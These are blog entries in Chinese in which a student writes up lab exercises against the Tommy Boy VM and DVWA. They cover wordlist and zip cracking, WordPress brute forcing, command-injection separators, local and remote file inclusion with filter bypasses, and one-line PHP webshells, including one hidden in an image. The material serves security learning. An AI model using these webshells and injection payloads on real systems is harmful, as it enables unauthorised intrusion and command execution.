data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/14.jpg" alt="14"><br>可以看出其中潜藏了一段md5码<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/15.jpg" alt="15"><br>解密结果为<strong>spanky</strong><br>看来spanky就是加密博客的密码<br>我们输入 访问<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/16.jpg" alt="16"><br>博客大致翻译如上<br>那么我们知道了<br>1.ftp服务器不咋稳定 每15分钟会开机关机循环<br>2.ftp有个名为<strong>nickburns</strong>的账户 密码很好猜<br>3.ftp在一个不寻常的端口上运行<br>我们ftp尝试链接<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/17.jpg" alt="17"><br>ps：这里省略了等待+nmap扫描端口后发现65534的过程<br>总之我们发现了一个名为readme.txt的文件<br>获取后开启<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/18.jpg" alt="18"><br>内容大意如下<br>按照他的意思 我们访问NickIzL33t目录<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/19.jpg" alt="19"><br>网站说只有他和史蒂夫乔布斯(苹果公司创始人)可以看到其中的内容<br>那看来是需要以iphone的身份来进入<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/20.jpg" alt="20"><br>我们去firefox的插件商城下个更改身份的插件(关键词<strong>User Agent Switcher</strong>)<br>安装完更改身份 刷新网页<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/21.jpg" alt="21"><br>他说我通过了第一个考验 但真正的内容需要我输入准确的.html目录<br>那就使用目录爆破工具<strong>dirbuster</strong>来扫描<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/22.jpg" alt="22"><br>ps:需要在<strong>options-advance options</strong>中将<strong>user agent(请求头)<strong>改为iphone 把</strong>file extension</strong>改为html<br>线程能拉多大拉多大 是为了加速出结果</p>
<blockquote>
<p>示意图:</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/24.png" alt="24"></p>
<p>待解决的问题：dirbuster报错20次会自动停止需要手动继续开始 目前没有找到解决方法</p>
</blockquote>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/23.jpg" alt="23"><br>得到结果fallon1.html 我们访问<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/24.jpg" alt="24"><br>获得 <strong>一个提示 flag3与pw备份</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/25.jpg" alt="25"></p>
<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p><strong>pw备份</strong>是个压缩包 我们暂且保存下来<br>发现需要密码<br>那我们看看提示有没有提供什么有用的</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/26.jpg" alt="26"><br>他告诉了我们密码的组成成分 而我们可以<strong>利用这点生成一个密码表</strong><br>通过搜索了解Tommy Boy上映于1995年<br>也就是说 密码为<code>bev[一个大写字符][两个数字][两个小写字符][一个符号]1995</code> 一共十三个字符<br>我们利用<strong>crunch</strong>工具生成密码表</p>
<blockquote>
<p>crunch使用指南</p>
<pre class="line-numbers language-none"><code class="language-none">crunch &lt;min-len&gt;  &lt;max-len&gt;  [&lt;charset string&gt;] [options]
-t     指定密码输出的格式
-o     将密码保存到指定文件

特殊字符，通常与-t配合使用
%      代表数字
^      代表特殊符号
@      代表小写字符
,      代表大写字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>这里按我们所需要的密码来输入命令</p>
<p><code>crunch 13 13 -t bev,%%@@^1995 -o password.txt</code><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/27.jpg" alt="27"><br>生成完毕了<br>我们再利用<strong>fcrackzip</strong>工具来爆破压缩包</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/28.jpg" alt="28"><br>先安装一下</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">fcrackzip -v -D -u -p [密码文件] [zip文件]
-v 更详细
-D 使用字典
-u 使用unzip清除错误密码
-p 密码文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>输入<code>fcrackzip -v -D -u -p password.txt t0msp4ssw0rdz.zip</code></p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/29.jpg" alt="29"><br>得到结果<strong>pw == bevH00tr$1995</strong><br>解压获得<strong>passwords.txt</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/30.jpg" alt="30"><br>查看 发现四个密码 其中俩不完整<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/31.jpg" alt="31"><br><strong>bigtommysenior</strong>的密码提示：密码为<strong>fatguyinalittlecoat</strong>后面加了点数字 但是他忘了是啥 提示在公司博客中<br><strong>bigtom</strong>(他连账号都不是很确定)的密码提示：和皇后乐队的一首有名歌曲有联系<br>既然公司博客的类型是<strong>wordpress</strong> 那我们就需要用到<strong>wpscan</strong>工具了</p>
<blockquote>
<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能.</p>
<pre class="line-numbers language-常用选项" data-language="常用选项"><code class="language-常用选项">&gt;--update  更新到最新版本
&gt;--url   | -u &lt;target url&gt;  要扫描的`WordPress`站点.
&gt;--force | -f   不检查网站运行的是不是`WordPress`
&gt;--enumerate | -e [option(s)]  枚举
&gt;u 枚举用户名，默认从1-10
&gt;u[10-20] 枚举用户名，配置从10-20
&gt;--username | -U &lt;username指定爆破的用户名
&gt;--wordlist | -w &lt;wordlist指定密码字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p>我们输入指令<code>wpscan --url "http://192.168.246.136/prehistoricforest/" -e u   </code><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/32.jpg" alt="32"><br>发现存在用户tom<br>那就指定爆破用户tom的密码<br><code>wpscan --url http://192![33](/33.jpg).168.246.136/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt -U tom</code><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/33.jpg" alt="33"><br>结果得出tom的密码为<strong>tomtom1</strong><br>我们利用这套账号密码登录公司wordpress博客的后台<br><img data-src="/34.jpg" alt="34"><br>里面有个未发布的文章 内容是之前提到的<strong>fatguyinalittlecoat</strong>后的数字<br>于是我们得出<br><strong>bigtommysenior</strong>的密码为<strong>fatguyinalittlecoat1938!!</strong></p>
<blockquote>
<p>坑：可能有点先入为主了 我试了好几遍fatguyinalittlecoat1938</p>
</blockquote>
<p>我们用这套账号密码登入该靶机的ssh服务</p>
<p><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/35.jpg" alt="35"><br>首先是获得了flag4 </p>
<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>根目录下的LOOT.ZIP有密码 暂且不管他<br>获得flag4的同时 它留下了提示:flag5位于服务器的**/.5.txt**中<br>但该文件需要root权限</p>
<p>那我们根据<strong>Linux的http网站的根目录一般都是/var/www/html</strong>来看看有没有之前破解过程中服务器中的<strong>NickIzL33t</strong></p>
<p>最终省略寻找过程 我们发现/<strong>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS</strong>下有一个开放权限的<strong>uploads</strong>文件夹<br>我们利用 <strong>文件上传漏洞</strong> 在其中创建一个文件<br><!--?php system($_GET['123']);?--><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/36.jpg" alt="36"></p>
<p>创建完毕 在firefox中利用木马<br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/37.jpg" alt="37"><br>他给出了第五个flag 并叫我们<strong>将五个flag结合起来 作为密码解压LOOT.ZIP</strong></p>
<pre class="line-numbers language-none"><code class="language-none">flag1：B34rcl4ws
flag2：Z4l1nsky
flag3：TinyHead
flag4：EditButton
flag5：Buttcrack
结合起来就是B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>解压LOOT.ZIP 获得THE-END.txt</strong><br><img data-src="/2023/12/01/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BTommyboy1dot0/38.jpg" alt="38"><br>过关！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总过程4 5小时 是我目前做过过程最繁琐的靶机<br>配合了多个工具 需要对多个漏洞有充分了解才能解开<br>经过这次打靶认识了不少新玩意 同时也认识到了一些不足<br>希望可以活用到下一次</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp命令执行漏洞</title>
    <url>/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p> 好的那么今天我们来讲命令执行漏洞<br>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a><br><strong>命令执行漏洞</strong> 一般指的是网站中有程序可以运行命令行指令<br>但忘记过滤 <strong>&amp;&amp; &amp; | || ;</strong> 等字符 使得恶意代码可以被允许运行的漏洞</p>
<span id="more"></span>

<blockquote>
<p>WINDOWS系统支持的管道符<br>“|”：直接执行后面的语句<br>例如：<code>ping www.baidu.com|whoami</code><br>“||”：如果前面执行的语句执行出错，则执行后面的语句<br>例如：<code>ping www.baidu.com||whoami</code><br>“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假<br>例如：<code>ping www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami</code><br>“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句<br>例如：<code>ping www.baidu.com&amp;&amp;whoami ping www.baidu.com&amp;&amp;whoami</code><br>LINUX系统支持的管道符<br>“；”执行完前面的命令执行后面的<br>“|”：显示后面语句的执行结果<br>“||”：当前面的语句执行出错时，执行后面的语句<br>“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假<br>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句<br>————————————————<br>版权声明：本文为CSDN博主「H3rmesk1t」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/LYJ20010728/article/details/117349106">https://blog.csdn.net/LYJ20010728/article/details/117349106</a></p>
</blockquote>
<p>169.254.x.x 受限地址 微软自己买下来的一段地址 一般是检测系统是否为windows的</p>
<h1 id="实操部分"><a href="#实操部分" class="headerlink" title="实操部分"></a>实操部分</h1><h2 id="1）低等级"><a href="#1）低等级" class="headerlink" title="1）低等级"></a>1）低等级</h2><p><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.jpg" alt="1"><br>查看网站源码 发现没有做过多限制<br>直接进行漏洞利用<br><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.jpg" alt="2.jpg"></p>
<h2 id="2-中级别"><a href="#2-中级别" class="headerlink" title="2).中级别"></a>2).中级别</h2><p>首先查看源码<br><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.jpg" alt="3.jpg"><br>可以看出它限制了 <strong>&amp;&amp;</strong> 与 <strong>;</strong> 会将它们替换为空格<br>那就很方便 使用 <strong>|</strong> 与其他的字符来绕过即可<br><img data-src="/2023/12/01/owasp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.jpg" alt="4.jpg"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp文件包含漏洞</title>
    <url>/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p> 那么我们今天来讲包含<br>老师给了关于<strong>文件上传和文件包含</strong>的笔记 那我就誊在这里 再把实践部分传过来<br>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p>
<span id="more"></span>

<h1 id="笔记部分"><a href="#笔记部分" class="headerlink" title="笔记部分"></a>笔记部分</h1><p>文件上传漏洞</p>
<h2 id="1-什么是文件上传漏洞"><a href="#1-什么是文件上传漏洞" class="headerlink" title="1.什么是文件上传漏洞"></a>1.什么是文件上传漏洞</h2><p>漏洞描述<br>文件上传是 Web 应用的必备功能之一，比如上传头像显示个性化、上传附件共享文件、上传脚本更新网站。如果服务器配置不当或者没有进行足够的过滤，Web 用户就可以上传任意文件，包括恶意脚本文件、exe 程序等，这就造成了文件上传漏洞。</p>
<h2 id="2-什么是webshell"><a href="#2-什么是webshell" class="headerlink" title="2.什么是webshell"></a>2.什么是webshell</h2><p>在计算机科学中，Shell 俗称壳（用来区别“核”），是指“为使用者提供操作界面”的软件（命令解释器）。类似于 windows 系统给的 cmd.exe 或者 Linux 下 bash 等，虽然这些系统的命令解释器不止一种。<br>WebShell 是一个网站的后门，也是一个命令解释器，不过是以 Web 方式（HTTP 协议）通信（传递命令消息），继承了 Web 用户的权限。WebShell 本质上是服务器端可运行的脚本文件，后缀名为.php/.asp/.aspx/.jsp 等，也就是说 WebShell 接受来自于 Web 用户的命令，然后在服务器端执行。</p>
<h2 id="3-一句话木马-小马"><a href="#3-一句话木马-小马" class="headerlink" title="3.一句话木马(小马)"></a>3.一句话木马(小马)</h2><pre class="line-numbers language-none"><code class="language-none">asp:
&lt;%e1val request("pass")%&gt;
php:
&lt;?php  @e1val($_GET['cmd']);?&gt;
&lt;?php @s1ystem($_GET['cmd']);?&gt;
&lt;?php $cmd=$_GET['cmd']; s1ystem($cmd); ?&gt;
&lt;?php @e1val($_POST['cmd']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>请记住以上4条语句！！！（其中数字1去掉）</p>
<h2 id="4-（低级别）文件上传漏洞"><a href="#4-（低级别）文件上传漏洞" class="headerlink" title="4.（低级别）文件上传漏洞"></a>4.（低级别）文件上传漏洞</h2><p>切换到UPload<br>1）先上传一张图片（文件大小在100KB以内），根据返回路径验证该文件受否存在。</p>
<p>2）再上传一个小马ma1.php，<br><!--?php  @e1val($_GET['cmd']);?--><br>根据返回路径验证该文件受否存在,并测试效果。</p>
<p>3）再上传一个小马ma2.php，<br><!--?php  @s1ystem($_GET['cmd']);?--><br>根据返回路径验证该文件受否存在,并测试效果。</p>
<p>4）再上传一个小马ma3.php，<br><!--?php @e1val($_POST['cmd']);?--><br>根据返回路径验证该文件受否存在,并测试效果。</p>
<p>5)使用中国菜刀（或蚁剑antword）链接ma3.php，测试文件上传、下载。（文件管理）</p>
<p>6）使用菜刀的虚拟终端功能，远程执行目标计算机系统指令。（虚拟终端）</p>
<p>7）使用菜刀的数据库管理功能，远程执行目标计算机系统指令。（数据库管理）</p>
<p><t>数据库类型</t><br><h>主机地址<h><br><u>数据库用户</u></h></h></p>
<p>数据库密码</p> 

<p>以上内容根据实际情况填写，本实验为：<br><t>MYSQL</t><br><h>192.168.88.128<h><br><u>root</u></h></h></p>
<p>owaspbwa</p> 

<h2 id="5-（中级别）文件上传漏洞"><a href="#5-（中级别）文件上传漏洞" class="headerlink" title="5.（中级别）文件上传漏洞"></a>5.（中级别）文件上传漏洞</h2><p>仍然上传一个PHP文件，发现失败，提示信息如下：<br>Your image was not uploaded.<br>查看网页后端源代码：<br>发现需满足如下条件：<br>if (($uploaded_type == “image/jpeg”) &amp;&amp;  ($uploaded_size &lt; 100000))<br>分析得出网站对客户端上传文件的MIME类型做了限制。</p>
<p>什么是MIME<br>MIME, 全称为“Multipurpose Internet Mail Extensions”, 比较确切的中文名称为“多用途互联网邮件扩展”。它是当前广泛应用的一种电子邮件技术规范，基本内容定义于RFC 2045-2049<br>什么是MIME类型?-在把输出结果传送到浏览器上的时候，浏览器必须启动适当的应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中。<br>例 如，架设你要传送一个Microsoft Excel文件到客户端。那么这时的MIME类型就是“application/vnd.ms-excel”。 在大多数实际情况中，这个文件然后将传送给 Execl来处理（假设我们设定Execl为处理特殊MIME类型的应用程序）。在ASP中，设定MIME类 型的方法是通过Response对象的 ContentType属性。<br>多媒体文件格式MIME<br>最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。<br>MIME意为多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。<br>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p>
<p>常见的MIME类型</p>
<p>超文本标记语言文本 .html,.html text/html<br>普通文本 .txt text/plain<br>RTF文本 .rtf application/rtf<br>GIF图形 .gif image/gif<br>JPEG图形 .ipeg,.jpg image/jpeg<br>au声音文件 .au audio/basic<br>MIDI音乐文件 mid,.midi audio/midi,audio/x-midi<br>RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio<br>MPEG文件 .mpg,.mpeg video/mpeg<br>AVI文件 .avi video/x-msvideo<br>GZIP文件 .gz application/x-gzip<br>TAR文件 .tar application/x-tar</p>
<p>如何修改上传文件的MIME类型，请出Web神器BurpSuite<br>BurpSuite可以将客户端与服务器之间传输的数据进行拦截，然后对数据进行修改并再次发送，从而完成攻击过程。<br>1)本实验我们BurpSuite代理服务器和客户端是同一台计算机（KALI），因此，BurpSuite代理模块监听127.0.0.1:8080(无需修改)；<br>2）设置客户端浏览器firefox的代理地址，指向BurpSuite代理服务器（127.0.0.1:8080）；<br>3）再次上传ma.php，发现网页一直等在那里（因为数据发送到了BurpSuite代理服务器，等待用户操作）；<br>4）在BurpSuite中拦截界面找到上传文件的数据包，修改上传文件的MIME类型<br>（修改content-type，由appalication/x-php改为imag/jpeg）<br>5)上传成功，后续操作略。</p>
<h2 id="6-（高级别）文件上传漏洞利用"><a href="#6-（高级别）文件上传漏洞利用" class="headerlink" title="6.（高级别）文件上传漏洞利用"></a>6.（高级别）文件上传漏洞利用</h2><p>仍然上传一个PHP文件，发现失败，提示信息如下：<br>Your image was not uploaded.<br>查看网页后端源代码：<br>发现需满足如下条件：<br>if (($uploaded_ext == “jpg” || $uploaded_ext == “JPG” || $uploaded_ext == “jpeg” || $uploaded_ext == “JPEG”) &amp;&amp; ($uploaded_size &lt; 100000))<br>分析得出网站对客户端上传文件的扩展名做了限制。<br>未完待续……<br>6.DVWA靶场文件包含漏洞利用（低级别）<br>To include a file edit the ?page=index.php in the URL to determine which file is included.<br>code:<br><code>&lt;?php     $file = $_GET['page']; //The page we wish to display   ?&gt; </code><br>文件包含漏洞<br>文件包含分为本地文件包含和远程文件包含</p>
<p>1）先看本地文件包含（包含的文件是目标计算机上的文件）<br>e.g:<br>?page=/etc/passwd<br>?page=/etc/resolv.conf<br>….<br>也可以包含一些我们自己创建的文件<br>我们登录到DVWA靶场，切换到/var/www/目录，创建2个文件：1.txt和2.php<br>cd /var/www/<br>echo 123 &gt; 1.txt<br>echo “<!--?php phpinfo(); ?-->“ &gt; 2.php<br>在kali上去包含我们自己创建的这2个文件，看看效果，有什么启发？</p>
<p>2）再看远程文件包含（包含的文件是远程计算机上的文件）<br>在kali上假设一个网站，网站主目录放点内容（也可以是3.txt和4.php）<br>systemctl status apache2<br>systemctl start apache2<br>cd /var/www/html<br>echo 123 &gt; 3.txt<br>echo “<!--?php phpinfo(); ?-->“ &gt; 4.php<br>进入DVWA文件包含页面，试着包含一下，看看效果<br><code>?page=http://kali的IP地址/3.txt</code><br><code>?page=http://kali的IP地址/4.php</code><br>sudo passwd root //修改root用户的密码</p>
<p>3)图片种马（将一句话木马写到图片中）<br>如何种马？准备一个正经的图片1.jpg和1个不正经的1.php,通过强大的copy命令合成一下：<br>copy 1.jpg/b+1.php/a hack.jpg<br>合成后验证这个图片能够正常显示，并查看图片中是否有这个一句话木马。<br>1.php内容如下：<br><code>&lt;?fputs(fopen("shell10.php","w"),'&lt;?php @system($_GET['cmd']);?&gt;')?&gt;</code></p>
<h2 id="7-（中级别）文件包含漏洞利用"><a href="#7-（中级别）文件包含漏洞利用" class="headerlink" title="7.（中级别）文件包含漏洞利用"></a>7.（中级别）文件包含漏洞利用</h2><p>先访问<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd</code><br>发现也存在本地文件包含漏洞<br>在测试一下是否存在远程文件包含漏洞<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/2.php</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/1.txt</code><br>发现远程文件包含漏洞不成功；<br>查看网站后端源码，发现以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
    $file = $_GET['page']; // The page we wish to display 
    
    // Bad input validation
    $file = str_replace("http://", "", $file);
    $file = str_replace("https://", "", $file); 
 ?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>尝试通过以下方式绕过：<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=hhttp://ttp://192.168.88.129/1.txt</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=HTTP://192.168.88.129/1.txt</code><br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=Http://192.168.88.129/1.txt</code></p>
<h2 id="8-（高级别）文件包含漏洞利用"><a href="#8-（高级别）文件包含漏洞利用" class="headerlink" title="8.（高级别）文件包含漏洞利用"></a>8.（高级别）文件包含漏洞利用</h2><p>先访问<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd</code><br>出现报错：<br>ERROR: File not found!<br><code>http://192.168.88.128/dvwa/vulnerabilities/fi/?page=http://192.168.88.129/1.txt</code><br>出现报错：<br>ERROR: File not found!<br>发现本地和远程文件包含漏洞都不成功；<br>查看网站后端源码，发现以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none"> &lt;?php
$file = $_GET['page']; //The page we wish to display 

// Only allow include.php
if ( $file != "include.php" ) {
    echo "ERROR: File not found!";
    exit;
}
?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这种代码的写法相当安全但是不够灵活！！！</p>
<h1 id="实操部分"><a href="#实操部分" class="headerlink" title="实操部分"></a>实操部分</h1><h2 id="1-漏洞发现"><a href="#1-漏洞发现" class="headerlink" title="1.漏洞发现"></a>1.漏洞发现</h2><p>总之先进入dvwa靶机 将难度调整至<strong>medium</strong> 选择<strong>file inclusion</strong><br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1.jpg" alt="1"><br>先通过<a href="http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd%E6%B5%8B%E8%AF%95">http://192.168.88.128/dvwa/vulnerabilities/fi/?page=/etc/passwd测试</a><br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2.jpg" alt="2"><br>确实存在本地文件包含漏洞<br>随后我们再来测试一下远程包含漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">systemctl status apache2 //查看系统apache2服务的情况
systemctl start apache2 //开启apache2服务
cd /var/www/html //进入apache2服务端源目录
echo 123 &gt; 3.txt //创建内容为123的3.txt文件
echo "&lt;?php phpinfo(); ?&gt;" &gt; 4.php //创建运行phpinfo的4.php网站<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/3.jpg" alt="3"><br>在page后加入<code>http://kali的ip/4.php</code><br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/4.jpg" alt="4"></p>
<p>发现没有成功</p>
<p>查看源码 寻找原因<br><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/5.jpg" alt="5"><br>发现网站中会将<code>http://</code>与<code>https://</code>替换为空格</p>
<p>这里有两种方法 <strong>大写</strong> 或 <strong>双写</strong></p>
<p><img data-src="/2023/11/28/owasp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/6.jpg" alt="6"><br>大写后发现成功绕过防护</p>
<blockquote>
<h3 id="好的-目前先讲到这里-我们日后再说"><a href="#好的-目前先讲到这里-我们日后再说" class="headerlink" title="好的 目前先讲到这里 我们日后再说"></a>好的 目前先讲到这里 我们日后再说</h3></blockquote>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之WALLABY&#39;S-NIGHTMARE</title>
    <url>/2023/11/24/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BWALLABY%E2%80%99S-NIGHTMARE/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p>最近加入了学校的网安工作室 每周会给点作业 小项目需要写writeup<br>总之这是今天的靶机 </p>
